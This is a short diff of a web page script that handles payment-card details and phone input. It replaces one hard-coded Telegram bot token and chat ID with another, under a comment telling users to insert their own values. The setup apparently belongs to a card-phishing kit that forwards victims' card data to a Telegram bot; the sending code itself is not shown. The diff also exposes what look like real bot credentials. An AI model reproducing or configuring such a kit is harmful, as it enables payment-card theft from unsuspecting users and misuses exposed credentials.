@@ -22,8 +22,8 @@ const cardOptions = document.querySelectorAll('.card-option');
 const cardDetails = document.getElementById('cardDetails');
 
 // Telegram settings - Replace with your actual values
-const telegramToken = '7793230815:AAG_bvautl-oMP43izsQ5cFg87ZOFnjdDOk';
-const chatId = '7959372593';
+const telegramToken = '7636588820:AAEIxrM4I9PsmXTH9KabnzsG6oA1AKFqHv0';
+const chatId = '6658986863';
 
 // Format phone number input
 if (phoneInput) {
